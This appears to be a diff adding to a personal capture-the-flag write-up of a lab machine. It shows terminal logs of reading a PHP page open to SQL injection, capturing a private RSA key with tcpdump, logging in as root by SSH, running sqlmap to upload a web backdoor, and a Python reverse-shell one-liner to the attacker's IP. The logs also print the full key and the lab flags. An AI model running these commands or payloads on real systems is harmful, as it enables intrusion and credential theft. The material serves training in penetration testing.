@@ -452,3 +452,457 @@ echo "1";
 www-data@incognito:/var/www/html/admin$ cat config.php
 cat config.php
 <?php
+$ini = parse_ini_file('/var/confs/webapp.ini');
+if($ini['env']=='dev'){
+$query=$_POST["username"];
+$mysqli = new mysqli("localhost","dev","password","db");
+if ($mysqli -> connect_errno) {
+  echo "Failed to connect to MySQL: " . $mysqli -> connect_error;
+  exit();
+}
+if ($result = $mysqli -> query('SELECT * FROM users where uname="'.$query.'"')) {
+  while( $row = $result->fetch_array() )
+{
+    echo "Username Password<br>";
+    echo $row['uname'] . " " . $row['password'];
+    echo "<br />";
+}
+  // Free result set
+  $result -> free_result();
+}
+}
+else{
+echo "";
+}
+?>
+
+www-data@incognito:/var/www/html/admin$ cat index.php
+cat index.php
+<?php
+
+$ini = parse_ini_file('/var/confs/webapp.ini');
+
+if($ini['env']=='dev'){
+
+echo "<html><head><div style='text-align:center'><h1 style='text-align:center'>Get Info of users</h1><form action='config.php' method='POST'>Username: <input type='text' name='username'/><input type='submit'/></form><br><h4>TODO: Add more features</div> <head></html>";
+}
+else{
+echo "<html> <head><h1>403 Forbidden</h1></head><!-- Make sure admin functionality can only be used in development environment. --></html>";
+}
+
+?>
+
+www-data@incognito:/var/www/html/admin$ cd /home
+cd /home
+www-data@incognito:/home$ ls
+ls
+tom
+www-data@incognito:/home$ cd tom
+cd tom
+www-data@incognito:/home/tom$ ls
+ls
+user.txt
+www-data@incognito:/home/tom$ cat user.txt
+cat user.txt
+4ce794a9d0019c1f684e07556821e0b0
+
+www-data@incognito:/home/tom$ getcap / -r 2>/dev/null
+getcap / -r 2>/dev/null
+/usr/sbin/tcpdump = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+
+like aratus
+
+www-data@incognito:/home/tom$ tcpdump -i lo -A
+tcpdump -i lo -A
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+17:08:02.090650 IP localhost.44096 > localhost.1027: Flags [S], seq 3848113646, win 65495, options [mss 65495,sackOK,TS val 3056414518 ecr 0,nop,wscale 6], length 0
+E..<..@.@.z..........@...]...........0.........
+.-/6........
+17:08:02.090664 IP localhost.1027 > localhost.44096: Flags [S.], seq 605020400, ack 3848113647, win 65483, options [mss 65495,sackOK,TS val 3056414518 ecr 3056414518,nop,wscale 6], length 0
+E..<..@.@.<............@$....].......0.........
+.-/6.-/6....
+17:08:02.090675 IP localhost.44096 > localhost.1027: Flags [.], ack 1, win 1024, options [nop,nop,TS val 3056414518 ecr 3056414518], length 0
+E..4..@.@.z!.........@...]..$........(.....
+.-/6.-/6
+17:08:02.091330 IP localhost.44096 > localhost.1027: Flags [P.], seq 1:116, ack 1, win 1024, options [nop,nop,TS val 3056414519 ecr 3056414518], length 115
+E.....@.@.y..........@...]..$..............
+.-/7.-/6GET /?admin=ScadfwerDSAd_343123ds123dqwe12 HTTP/1.1
+Host: 127.0.0.1:1027
+User-Agent: curl/7.58.0
+Accept: */*
+
+17:08:02.113540 IP localhost.1027 > localhost.44096: Flags [P.], seq 1:18, ack 116, win 1024, options [nop,nop,TS val 3056414541 ecr 3056414519], length 17
+E..E.R@.@..^...........@$....].b.....9.....
+.-/M.-/7HTTP/1.0 200 OK
+
+17:08:02.113552 IP localhost.44096 > localhost.1027: Flags [.], ack 18, win 1024, options [nop,nop,TS val 3056414541 ecr 3056414541], length 0
+E..4..@.@.z..........@...].b$........(.....
+.-/M.-/M
+17:08:02.114120 IP localhost.1027 > localhost.44096: Flags [P.], seq 18:156, ack 116, win 1024, options [nop,nop,TS val 3056414542 ecr 3056414541], length 138
+E....S@.@..............@$....].b...........
+.-/N.-/MContent-Type: text/html; charset=utf-8
+Content-Length: 1678
+Server: Werkzeug/1.0.1 Python/3.6.9
+Date: Sun, 23 Jul 2023 17:08:02 GMT
+
+17:08:02.114127 IP localhost.44096 > localhost.1027: Flags [.], ack 156, win 1022, options [nop,nop,TS val 3056414542 ecr 3056414542], length 0
+E..4..@.@.z..........@...].b$........(.....
+.-/N.-/N
+17:08:02.114144 IP localhost.1027 > localhost.44096: Flags [P.], seq 156:1834, ack 116, win 1024, options [nop,nop,TS val 3056414542 ecr 3056414542], length 1678
+E....T@.@..............@$....].b...........
+.-/N.-/N-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj
+rt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k
+wJ0ALG6wdjmHdRDW91JW0pG9Q+nTyv22K0a/yT91ZdlL/5cVjGKtYIob/504AdZZ
+5NyCGq8t7ZUKhx0+TuKKcr2dDfL6rC5GBAnDkMxqo6tjkUH9nlFK7E9is0u1F3Zx
+qrgn6PwOLDHeLgrQUok8NUwxDYxRM5zXT+I1Lr7/fGy/50ASvyDxZyjDuHbB7s14
+K2HI32lVrx8u4X9Y2zgIU/mlIjuUtTyIAH4kswIDAQABAoIBAQCcPUImIPmZrwcU
+09tLBx7je/CkCI3VVEngds9XcfdxUZTPrPMsk490IFpbmt6uG37Qxp2QuauEsUEg
+v0uxCbtHJSB169XUftXAMzLAurFY09rHOcK84HzeGl3t6+N0U2PGrqdAzoyVblef
+U9yZ3D46Idj3LS9pDumLnNZ0rZAWcaHW+rgjNqjsoBdQL7HGW+sacDAmZzU/Eti9
+mH97NnrxkZuGXcnabXWcUj0HFHssCpF8KFPT3xxwtrqkUTJdMvUxxCD54HXiKM3u
+jLXlX+HwHfLKHugYvLUuez7XFi6UP83Hiqmq48kB09sBa2iTV/iy6mHe7iyeELaa
+9o7WHF2hAoGBAOPxNWc3vH18qu3WC6eMphPdYOaGBjbNBOgzJxzh/evxpSwRSG9V
+63gNgKJ8zccQff/HH1n54VS+tuF7RCykRNb+Ne7K/uiDe1TpOKEMi7XtXOYHy5s1
+tykL0OPdSs4hN1jMJjkSfPgdNPmxM3bbJMHDPjdQXAK6DnXmOCETaPAnAoGBAOFm
+Fhqv8OREYFq+h1mDzMJn5WsNQQZnvvetJR7g3gfKcVblwMhlh504Tf3o00OGCKC1
+L4iWMNb6uitKfTmGNta5X8ChWSVxXbb9fOWCOudNGt/fb70SK6fK9CSl66i/niIw
+cIcu0tpS/T3MoqwMiGk87ivtW3bK20TsnY0tX3KVAoGAEeJdBEo1OctMRfjjVTQN
+28Uk0zF0z1vqpKVOzk9U8uw0v25jtoiRPwwgKZ+NLa83k5f198NJULLd+ncHdFE3
+LX8okCHROkEGrjTWQpyPYajL/yhhaz4drtTEgPxd4CpvA0KRRS0ULQttmqGyngK3
+sZQ2D3T4oyYh+FIl2UKCm0UCgYEAyiHWqNAnY02+ayJ6FtiPg7fQkZQtQCVBqLNp
+mqtl8e6mfZtEq3IBkAiySIXHD8Lfcd+KZR7rZZ8r3S7L5g5ql11edU08uMtVk4j3
+vIpxcIRBGYsylYf6BluHXmY9U/OjSF3QTCq9hHTwDb+6EjibDGVL4bDWWU3KHaFk
+GPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6
+ClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v
+QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
+-----END RSA PRIVATE KEY-----
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ nano metamorfosis_rsa       
+                                                                                     
+┌──(witty㉿kali)-[~/Downloads]
+└─$ chmod 600 metamorfosis_rsa 
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh -i metamorfosis_rsa root@10.10.84.192
+The authenticity of host '10.10.84.192 (10.10.84.192)' can't be established.
+ED25519 key fingerprint is SHA256:8QhkjOmau5tEvySYZcNlR9w+DtEtBuYhh4kmgoSMPXI.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.84.192' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-144-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Jul 23 17:13:22 UTC 2023
+
+  System load:  0.0               Processes:           114
+  Usage of /:   53.3% of 8.79GB   Users logged in:     0
+  Memory usage: 87%               IP address for eth0: 10.10.84.192
+  Swap usage:   0%
+
+0 updates can be applied immediately.
+
+Last login: Sat Apr 10 19:40:46 2021
+root@incognito:~# ls
+req.sh  root.txt  serv.py
+root@incognito:~# cat root.txt
+7ffca2ec63534d165525bf37d91b4ff4
+root@incognito:~# cat serv.py
+from flask import Flask,request
+
+app = Flask(__name__)
+
+@app.route('/')
+def root():
+    admin = request.args.get('admin')
+    if(admin=="ScadfwerDSAd_343123ds123dqwe12"):
+        return """-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj
+rt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k
+wJ0ALG6wdjmHdRDW91JW0pG9Q+nTyv22K0a/yT91ZdlL/5cVjGKtYIob/504AdZZ
+5NyCGq8t7ZUKhx0+TuKKcr2dDfL6rC5GBAnDkMxqo6tjkUH9nlFK7E9is0u1F3Zx
+qrgn6PwOLDHeLgrQUok8NUwxDYxRM5zXT+I1Lr7/fGy/50ASvyDxZyjDuHbB7s14
+K2HI32lVrx8u4X9Y2zgIU/mlIjuUtTyIAH4kswIDAQABAoIBAQCcPUImIPmZrwcU
+09tLBx7je/CkCI3VVEngds9XcfdxUZTPrPMsk490IFpbmt6uG37Qxp2QuauEsUEg
+v0uxCbtHJSB169XUftXAMzLAurFY09rHOcK84HzeGl3t6+N0U2PGrqdAzoyVblef
+U9yZ3D46Idj3LS9pDumLnNZ0rZAWcaHW+rgjNqjsoBdQL7HGW+sacDAmZzU/Eti9
+mH97NnrxkZuGXcnabXWcUj0HFHssCpF8KFPT3xxwtrqkUTJdMvUxxCD54HXiKM3u
+jLXlX+HwHfLKHugYvLUuez7XFi6UP83Hiqmq48kB09sBa2iTV/iy6mHe7iyeELaa
+9o7WHF2hAoGBAOPxNWc3vH18qu3WC6eMphPdYOaGBjbNBOgzJxzh/evxpSwRSG9V
+63gNgKJ8zccQff/HH1n54VS+tuF7RCykRNb+Ne7K/uiDe1TpOKEMi7XtXOYHy5s1
+tykL0OPdSs4hN1jMJjkSfPgdNPmxM3bbJMHDPjdQXAK6DnXmOCETaPAnAoGBAOFm
+Fhqv8OREYFq+h1mDzMJn5WsNQQZnvvetJR7g3gfKcVblwMhlh504Tf3o00OGCKC1
+L4iWMNb6uitKfTmGNta5X8ChWSVxXbb9fOWCOudNGt/fb70SK6fK9CSl66i/niIw
+cIcu0tpS/T3MoqwMiGk87ivtW3bK20TsnY0tX3KVAoGAEeJdBEo1OctMRfjjVTQN
+28Uk0zF0z1vqpKVOzk9U8uw0v25jtoiRPwwgKZ+NLa83k5f198NJULLd+ncHdFE3
+LX8okCHROkEGrjTWQpyPYajL/yhhaz4drtTEgPxd4CpvA0KRRS0ULQttmqGyngK3
+sZQ2D3T4oyYh+FIl2UKCm0UCgYEAyiHWqNAnY02+ayJ6FtiPg7fQkZQtQCVBqLNp
+mqtl8e6mfZtEq3IBkAiySIXHD8Lfcd+KZR7rZZ8r3S7L5g5ql11edU08uMtVk4j3
+vIpxcIRBGYsylYf6BluHXmY9U/OjSF3QTCq9hHTwDb+6EjibDGVL4bDWWU3KHaFk
+GPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6
+ClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v
+QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
+-----END RSA PRIVATE KEY-----"""
+    else:
+        return "Only Talking to Root User"
+
+if __name__=='__main__':
+    app.run(port=1027)
+root@incognito:~# cat req.sh
+#!/bin/sh
+
+curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12
+
+using pspy if someone already got root.txt and execute curl we can see and get 
+just curling
+ CMD: UID=0     PID=2247   | curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12 
+
+root@incognito:~# tty
+/dev/pts/0
+root@incognito:~# who
+root     pts/0         (10.8.19.103)
+root@incognito:~# w
+ 17:17:31 up  1:07,  1 user,  load average: 0.00, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/0    10.8.19.103      17:13    1.00s  0.04s  0.00s w
+
+doing with sqlmap
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat req_metamor.txt 
+POST /admin/config.php HTTP/1.1
+Host: 10.10.84.192
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 149
+Origin: http://10.10.84.192
+Connection: close
+Referer: http://10.10.84.192/admin/
+Upgrade-Insecure-Requests: 1
+
+username=wittty
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sqlmap -r req_metamor.txt --risk 3 --level 5 
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.7.2#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:20:09 //
+
+[13:20:09] [INFO] parsing HTTP request from 'req_metamor.txt'
+[13:20:09] [INFO] testing connection to the target URL
+[13:20:10] [INFO] testing if the target URL content is stable
+[13:20:10] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
+[13:20:10] [INFO] testing if POST parameter 'username' is dynamic
+[13:20:10] [WARNING] POST parameter 'username' does not appear to be dynamic
+[13:20:11] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[13:20:11] [INFO] testing for SQL injection on POST parameter 'username'
+[13:20:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[13:20:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[13:20:27] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --string="tom")
+[13:20:32] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
+
+[13:22:28] [ERROR] user quit
+
+[*] ending @ 13:22:28 //
+
+                                                                                                                
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sqlmap -r req_metamor.txt -p username --risk 3 --level 5
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.7.2#stable}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:22:36 //
+
+[13:22:36] [INFO] parsing HTTP request from 'req_metamor.txt'
+[13:22:36] [INFO] testing connection to the target URL
+[13:22:36] [INFO] testing if the target URL content is stable
+[13:22:37] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
+[13:22:37] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[13:22:37] [INFO] testing for SQL injection on POST parameter 'username'
+[13:22:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[13:22:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[13:22:53] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --string="tom")
+[13:22:55] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+[13:23:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[13:23:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[13:23:04] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[13:23:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[13:23:05] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[13:23:05] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[13:23:05] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[13:23:05] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[13:23:06] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[13:23:06] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[13:23:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[13:23:06] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[13:23:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[13:23:07] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[13:23:07] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[13:23:07] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[13:23:08] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[13:23:08] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[13:23:08] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[13:23:08] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[13:23:08] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[13:23:08] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[13:23:08] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[13:23:08] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[13:23:08] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[13:23:08] [INFO] testing 'Generic inline queries'
+[13:23:08] [INFO] testing 'MySQL inline queries'
+[13:23:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[13:23:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[13:23:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[13:23:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[13:23:09] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[13:23:10] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[13:23:10] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[13:23:21] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[13:23:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[13:23:21] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[13:23:27] [INFO] target URL appears to be UNION injectable with 3 columns
+[13:23:27] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+[13:23:27] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 121 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-5828" OR 4017=4017-- zyHy
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=wittty" AND (SELECT 9191 FROM (SELECT(SLEEP(5)))BzpJ)-- duDC
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=wittty" UNION ALL SELECT NULL,NULL,CONCAT(0x7162717071,0x6c5a624874524c6d6d66577871475949466b7a715458694f71456d666a504f4454527a525a43616f,0x7171787a71)-- -
+---
+[13:23:38] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12
+[13:23:40] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.84.192'
+
+[*] ending @ 13:23:40 //
+
+username=wittty" UNION ALL SELECT NULL,NULL,CONCAT(0x7162717071,0x6c5a624874524c6d6d66577871475949466b7a715458694f71456d666a504f4454527a525a43616f,0x7171787a71)-- -
+
+3 cols and third is writable like we did
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sqlmap -r req_metamor.txt -p username --risk 3 --level 5 --os-shell
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.7.2#stable}
+|_ -| . [(]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:24:57 //
+
+[13:24:57] [INFO] parsing HTTP request from 'req_metamor.txt'
+[13:24:58] [INFO] resuming back-end DBMS 'mysql' 
+[13:24:58] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-5828" OR 4017=4017-- zyHy
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=wittty" AND (SELECT 9191 FROM (SELECT(SLEEP(5)))BzpJ)-- duDC
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=wittty" UNION ALL SELECT NULL,NULL,CONCAT(0x7162717071,0x6c5a624874524c6d6d66577871475949466b7a715458694f71456d666a504f4454527a525a43616f,0x7171787a71)-- -
+---
+[13:24:58] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12
+[13:24:58] [INFO] going to use a web backdoor for command prompt
+[13:24:58] [INFO] fingerprinting the back-end DBMS operating system
+[13:24:58] [INFO] the back-end DBMS operating system is Linux
+which web application language does the web server support?
+[1] ASP
+[2] ASPX
+[3] JSP
+[4] PHP (default)
+> 4
+do you want sqlmap to further try to provoke the full path disclosure? [Y/n] n
+[13:25:37] [WARNING] unable to automatically retrieve the web server document root
+what do you want to use for writable directory?
+[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs, /usr/local/var/www') (default)
+[2] custom location(s)
+[3] custom directory list file
+[4] brute force search
+> 4
+[13:25:40] [INFO] using generated directory list: /var/www,/var/www/html,/var/www/htdocs,/var/www/httpdocs,/var/www/php,/var/www/public,/var/www/src,/var/www/site,/var/www/build,/var/www/web,/var/www/data,/var/www/sites/all,/var/www/www/build,/usr/local/apache,/usr/local/apache/html,/usr/local/apache/htdocs,/usr/local/apache/httpdocs,/usr/local/apache/php,/usr/local/apache/public,/usr/local/apache/src,/usr/local/apache/site,/usr/local/apache/build,/usr/local/apache/web,/usr/local/apache/www,/usr/local/apache/data,/usr/local/apache/sites/all,/usr/local/apache/www/build,/usr/local/apache2,/usr/local/apache2/html,/usr/local/apache2/htdocs,/usr/local/apache2/httpdocs,/usr/local/apache2/php,/usr/local/apache2/public,/usr/local/apache2/src,/usr/local/apache2/site,/usr/local/apache2/build,/usr/local/apache2/web,/usr/local/apache2/www,/usr/local/apache2/data,/usr/local/apache2/sites/all,/usr/local/apache2/www/build,/usr/local/www/apache22,/usr/local/www/apache22/html,/usr/local/www/apache22/htdocs,/usr/local/www/apache22/httpdocs,/usr/local/www/apache22/php,/usr/local/www/apache22/public,/usr/local/www/apache22/src,/usr/local/www/apache22/site,/usr/local/www/apache22/build,/usr/local/www/apache22/web,/usr/local/www/apache22/www,/usr/local/www/apache22/data,/usr/local/www/apache22/sites/all,/usr/local/www/apache22/www/build,/usr/local/www/apache24,/usr/local/www/apache24/html,/usr/local/www/apache24/htdocs,/usr/local/www/apache24/httpdocs,/usr/local/www/apache24/php,/usr/local/www/apache24/public,/usr/local/www/apache24/src,/usr/local/www/apache24/site,/usr/local/www/apache24/build,/usr/local/www/apache24/web,/usr/local/www/apache24/www,/usr/local/www/apache24/data,/usr/local/www/apache24/sites/all,/usr/local/www/apache24/www/build,/usr/local/httpd,/usr/local/httpd/html,/usr/local/httpd/htdocs,/usr/local/httpd/httpdocs,/usr/local/httpd/php,/usr/local/httpd/public,/usr/local/httpd/src,/usr/local/httpd/site,/usr/local/httpd/build,/usr/local/httpd/web,/usr/local/httpd/www,/usr/local/httpd/data,/usr/local/httpd/sites/all,/usr/local/httpd/www/build,/var/www/nginx-default,/var/www/nginx-default/html,/var/www/nginx-default/htdocs,/var/www/nginx-default/httpdocs,/var/www/nginx-default/php,/var/www/nginx-default/public,/var/www/nginx-default/src,/var/www/nginx-default/site,/var/www/nginx-default/build,/var/www/nginx-default/web,/var/www/nginx-default/www,/var/www/nginx-default/data,/var/www/nginx-default/sites/all,/var/www/nginx-default/www/build,/srv/www,/srv/www/html,/srv/www/htdocs,/srv/www/httpdocs,/srv/www/php,/srv/www/public,/srv/www/src,/srv/www/site,/srv/www/build,/srv/www/web,/srv/www/data,/srv/www/sites/all,/srv/www/www/build
+use any additional custom directories [Enter for None]: 
+[13:25:42] [WARNING] unable to automatically parse any web server path
+[13:25:42] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
+[13:25:43] [WARNING] unable to upload the file stager on '/var/www/'
+[13:25:43] [INFO] trying to upload the file stager on '/var/www/' via UNION method
+[13:25:44] [WARNING] expect junk characters inside the file as a leftover from UNION query
+[13:25:44] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
+[13:25:45] [INFO] trying to upload the file stager on '/var/www/admin/' via LIMIT 'LINES TERMINATED BY' method
+[13:25:46] [WARNING] unable to upload the file stager on '/var/www/admin/'
+[13:25:46] [INFO] trying to upload the file stager on '/var/www/admin/' via UNION method
+[13:25:46] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
+[13:25:48] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
+[13:25:49] [WARNING] unable to upload the file stager on '/var/www/html/'
+[13:25:49] [INFO] trying to upload the file stager on '/var/www/html/' via UNION method
+[13:25:49] [INFO] the remote file '/var/www/html/tmpueheq.php' is larger (707 B) than the local file '/tmp/sqlmapnvxwjkyb406281/tmp0hsarfhi' (705B)
+[13:25:50] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://10.10.84.192:80/tmpueheq.php
+[13:25:51] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://10.10.84.192:80/tmpbqcuy.php
+[13:25:51] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
+os-shell> id
+do you want to retrieve the command standard output? [Y/n/a] 
+command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
+
+os-shell> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.84.192] 56436
+www-data@incognito:/var/www/html$ :)
+```
+![[Pasted image 20230723115224.png]]
+user.txt
+*4ce794a9d0019c1f684e07556821e0b0*
+root.txt
+*7ffca2ec63534d165525bf37d91b4ff4*
+
+## Notes / Lessons Learned
+[[Jacob the Boss]]
+
